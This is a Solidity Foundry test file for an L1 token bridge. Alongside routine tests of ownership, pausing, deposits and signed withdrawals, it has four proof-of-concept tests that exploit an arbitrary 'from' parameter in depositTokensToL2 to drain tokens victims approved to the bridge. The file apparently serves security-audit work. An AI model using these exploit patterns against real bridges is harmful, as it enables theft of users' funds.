// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import { Test, console2 } from "forge-std/Test.sol";
import { ECDSA } from "openzeppelin/contracts/utils/cryptography/ECDSA.sol";
import { MessageHashUtils } from "openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol";
import { Ownable } from "openzeppelin/contracts/access/Ownable.sol";
import { Pausable } from "@openzeppelin/contracts/utils/Pausable.sol";
import { L1BossBridge, L1Vault } from "../src/L1BossBridge.sol";
import { IERC20 } from "openzeppelin/contracts/interfaces/IERC20.sol";
import { L1Token } from "../src/L1Token.sol";

contract L1BossBridgeTest is Test {
    event Deposit(address from, address to, uint256 amount);

    address deployer = makeAddr("deployer");
    address user = makeAddr("user");
    address userInL2 = makeAddr("userInL2");
    Account operator = makeAccount("operator");

    L1Token token;
    L1BossBridge tokenBridge;
    L1Vault vault;

    function setUp() public {
        vm.startPrank(deployer);

        // Deploy token and transfer the user some initial balance
        token = new L1Token();
        token.transfer(address(user), 1000e18);

        // Deploy bridge
        tokenBridge = new L1BossBridge(IERC20(token));
        vault = tokenBridge.vault();

        // Add a new allowed signer to the bridge
        tokenBridge.setSigner(operator.addr, true);

        vm.stopPrank();
    }

    function testDeployerOwnsBridge() public {
        address owner = tokenBridge.owner();
        assertEq(owner, deployer);
    }

    function testBridgeOwnsVault() public {
        address owner = vault.owner();
        assertEq(owner, address(tokenBridge));
    }

    function testTokenIsSetInBridgeAndVault() public {
        assertEq(address(tokenBridge.token()), address(token));
        assertEq(address(vault.token()), address(token));
    }

    function testVaultInfiniteAllowanceToBridge() public {
        assertEq(token.allowance(address(vault), address(tokenBridge)), type(uint256).max);
    }

    function testOnlyOwnerCanPauseBridge() public {
        vm.prank(tokenBridge.owner());
        tokenBridge.pause();
        assertTrue(tokenBridge.paused());
    }

    function testNonOwnerCannotPauseBridge() public {
        vm.expectRevert(abi.encodeWithSelector(Ownable.OwnableUnauthorizedAccount.selector, address(this)));
        tokenBridge.pause();
    }

    function testOwnerCanUnpauseBridge() public {
        vm.startPrank(tokenBridge.owner());
        tokenBridge.pause();
        assertTrue(tokenBridge.paused());

        tokenBridge.unpause();
        assertFalse(tokenBridge.paused());
        vm.stopPrank();
    }

    function testNonOwnerCannotUnpauseBridge() public {
        vm.prank(tokenBridge.owner());
        tokenBridge.pause();
        assertTrue(tokenBridge.paused());

        vm.expectRevert(abi.encodeWithSelector(Ownable.OwnableUnauthorizedAccount.selector, address(this)));
        tokenBridge.unpause();
    }

    function testInitialSignerWasRegistered() public {
        assertTrue(tokenBridge.signers(operator.addr));
    }

    function testNonOwnerCannotAddSigner() public {
        vm.expectRevert(abi.encodeWithSelector(Ownable.OwnableUnauthorizedAccount.selector, address(this)));
        tokenBridge.setSigner(operator.addr, true);
    }

    function testUserCannotDepositWhenBridgePaused() public {
        vm.prank(tokenBridge.owner());
        tokenBridge.pause();

        vm.startPrank(user);
        uint256 amount = 10e18;
        token.approve(address(tokenBridge), amount);

        vm.expectRevert(Pausable.EnforcedPause.selector);
        tokenBridge.depositTokensToL2(user, userInL2, amount);
        vm.stopPrank();
    }

    function testUserCanDepositTokens() public {
        vm.startPrank(user);
        uint256 amount = 10e18;
        token.approve(address(tokenBridge), amount);

        vm.expectEmit(address(tokenBridge));
        emit Deposit(user, userInL2, amount);
        tokenBridge.depositTokensToL2(user, userInL2, amount);

        assertEq(token.balanceOf(address(tokenBridge)), 0);
        assertEq(token.balanceOf(address(vault)), amount);
        vm.stopPrank();
    }

    function testUserCannotDepositBeyondLimit() public {
        vm.startPrank(user);
        uint256 amount = tokenBridge.DEPOSIT_LIMIT() + 1;
        deal(address(token), user, amount);
        token.approve(address(tokenBridge), amount);

        vm.expectRevert(L1BossBridge.L1BossBridge__DepositLimitReached.selector);
        tokenBridge.depositTokensToL2(user, userInL2, amount);
        vm.stopPrank();
    }

    function testUserCanWithdrawTokensWithOperatorSignature() public {
        vm.startPrank(user);
        uint256 depositAmount = 10e18;
        uint256 userInitialBalance = token.balanceOf(address(user));

        token.approve(address(tokenBridge), depositAmount);
        tokenBridge.depositTokensToL2(user, userInL2, depositAmount);

        assertEq(token.balanceOf(address(vault)), depositAmount);
        assertEq(token.balanceOf(address(user)), userInitialBalance - depositAmount);

        (uint8 v, bytes32 r, bytes32 s) = _signMessage(_getTokenWithdrawalMessage(user, depositAmount), operator.key);
        tokenBridge.withdrawTokensToL1(user, depositAmount, v, r, s);

        assertEq(token.balanceOf(address(user)), userInitialBalance);
        assertEq(token.balanceOf(address(vault)), 0);
    }

    function testUserCannotWithdrawTokensWithUnknownOperatorSignature() public {
        vm.startPrank(user);
        uint256 depositAmount = 10e18;
        uint256 userInitialBalance = token.balanceOf(address(user));

        token.approve(address(tokenBridge), depositAmount);
        tokenBridge.depositTokensToL2(user, userInL2, depositAmount);

        assertEq(token.balanceOf(address(vault)), depositAmount);
        assertEq(token.balanceOf(address(user)), userInitialBalance - depositAmount);

        (uint8 v, bytes32 r, bytes32 s) =
            _signMessage(_getTokenWithdrawalMessage(user, depositAmount), makeAccount("unknownOperator").key);

        vm.expectRevert(L1BossBridge.L1BossBridge__Unauthorized.selector);
        tokenBridge.withdrawTokensToL1(user, depositAmount, v, r, s);
    }

    function testUserCannotWithdrawTokensWithInvalidSignature() public {
        vm.startPrank(user);
        uint256 depositAmount = 10e18;

        token.approve(address(tokenBridge), depositAmount);
        tokenBridge.depositTokensToL2(user, userInL2, depositAmount);
        uint8 v = 0;
        bytes32 r = 0;
        bytes32 s = 0;

        vm.expectRevert(ECDSA.ECDSAInvalidSignature.selector);
        tokenBridge.withdrawTokensToL1(user, depositAmount, v, r, s);
    }

    function testUserCannotWithdrawTokensWhenBridgePaused() public {
        vm.startPrank(user);
        uint256 depositAmount = 10e18;

        token.approve(address(tokenBridge), depositAmount);
        tokenBridge.depositTokensToL2(user, userInL2, depositAmount);

        (uint8 v, bytes32 r, bytes32 s) = _signMessage(_getTokenWithdrawalMessage(user, depositAmount), operator.key);
        vm.startPrank(tokenBridge.owner());
        tokenBridge.pause();

        vm.expectRevert(Pausable.EnforcedPause.selector);
        tokenBridge.withdrawTokensToL1(user, depositAmount, v, r, s);
    }

    function _getTokenWithdrawalMessage(address recipient, uint256 amount) private view returns (bytes memory) {
        return abi.encode(
            address(token), // target
            0, // value
            abi.encodeCall(IERC20.transferFrom, (address(vault), recipient, amount)) // data
        );
    }

    /**
     * Mocks part of the off-chain mechanism where there operator approves requests for withdrawals by signing them.
     * Although not coded here (for simplicity), you can safely assume that our operator refuses to sign any withdrawal
     * request from an account that never originated a transaction containing a successful deposit.
     */
    function _signMessage(
        bytes memory message,
        uint256 privateKey
    )
        private
        pure
        returns (uint8 v, bytes32 r, bytes32 s)
    {
        return vm.sign(privateKey, MessageHashUtils.toEthSignedMessageHash(keccak256(message)));
    }
}

contract AttackVectorPoCTests is L1BossBridgeTest {
    address attacker = makeAddr("attacker");
    address attackerInL2 = makeAddr("attackerInL2");

    /**
     * @notice Attack Vector1: Direct Approver Balance Theft
     * @dev An attacker calls depositTokensToL2 specifying a victim who approved the bridge; The victim's tokens are pulled without their consent.
     */
    function test_poc_attackVector1_directApproverBalanceTheft() public{
        uint256 victimBalance = token.balanceOf(address(user));

        // Victim approves the bridge for bridging operations (e.g., unlimited approval)
        vm.prank(user);
        token.approve(address(tokenBridge), type(uint256).max);

        assertEq(token.balanceOf(user), victimBalance);
        assertEq(token.balanceOf(address(vault)), 0);

        // Attacker observes user's approval and drains their entire balance
        vm.prank(attacker);
        tokenBridge.depositTokensToL2(user, attackerInL2, victimBalance);

        // Victim is completely drained; vault holds the stolen funds
        assertEq(token.balanceOf(user), 0);
        assertEq(token.balanceOf(address(vault)), victimBalance);
    }

    /**
     * @notice Attack vector 2: Infinite L2 Mint/Double Dip
     * @dev The attacker uses victim funds to trigger a valid Deposit event crediting attackerInL2. The off-chain relayer will mint L2 tokens to the attacker.
     */
    function test_poc_attackVector2_unbackedL2MintForAttacker() public {
        uint256 stolenAmount = 500e18;

        // Victim approves bridge
        vm.prank(user);
        token.approve(address(tokenBridge), stolenAmount);

        // Attacker triggers deposit using victim's address as `from` and attackerInL2 as 'l2Recipient'
        vm.expectEmit(address(tokenBridge));
        emit Deposit(user, attackerInL2, stolenAmount);

        vm.prank(attacker);
        tokenBridge.depositTokensToL2(user, attackerInL2, stolenAmount);

        // Attacker has successfully routed L2 minting credits to themselves using victim's tokens
        assertEq(token.balanceOf(user), 1000e18 - stolenAmount);
        assertEq(token.balanceOf(address(vault)), stolenAmount);
    }

    /**
     * @notice Attack Vector 3: Mempool Front-Running/MEV Sniping
     * @dev Victim submits approval and deposit. Attacker detects approval in mempool and front-runs victim's deposit call, causing victim's transaction to fail.
     */
    function test_poc_attackVector3_mempoolFrontRunning() public {
        uint256 depositAmount = 100e18;

        // Step 1: Victim approves tokens on L1 (Transaction 1)
        vm.prank(user);
        token.approve(address(tokenBridge), depositAmount);

        // Step 2: Attacker spots victim's approval in mempool and front-runs victim's deposit (Transaction 2a)
        vm.prank(attacker);
        tokenBridge.depositTokensToL2(user, attackerInL2, depositAmount);

        // Step 3: Victim's original deposit transaction executes next and reverts due to exhausted allowance (Transaction 2b)
        vm.prank(user);
        vm.expectRevert();
        tokenBridge.depositTokensToL2(user, userInL2, depositAmount);
    }

    /**
     * @notice Attack Vector 4: Vault & User Liquidity Exhaustion
     * @dev Attacker iterates over multiple approved users and sweeps all liquidity into vault under attacker-controlled L2 recipients, monopolizing vault claims.
     */
    function test_poc_attackVector4_vaultAndLiquidityExhaustion() public {
        address victim2 = makeAddr("victim2");

        // Deal tokens directly to victim2
        deal(address(token), victim2, 500e18);

        vm.prank(user);
        token.approve(address(tokenBridge), type(uint256).max);

        vm.prank(victim2);
        token.approve(address(tokenBridge), type(uint256).max);

        vm.startPrank(attacker);
        tokenBridge.depositTokensToL2(user, attackerInL2, token.balanceOf(user));
        tokenBridge.depositTokensToL2(victim2, attackerInL2, token.balanceOf(victim2));
        vm.stopPrank();

        assertEq(token.balanceOf(user), 0);
        assertEq(token.balanceOf(victim2), 0);
        assertEq(token.balanceOf(address(vault)), 1500e18);
    }
}
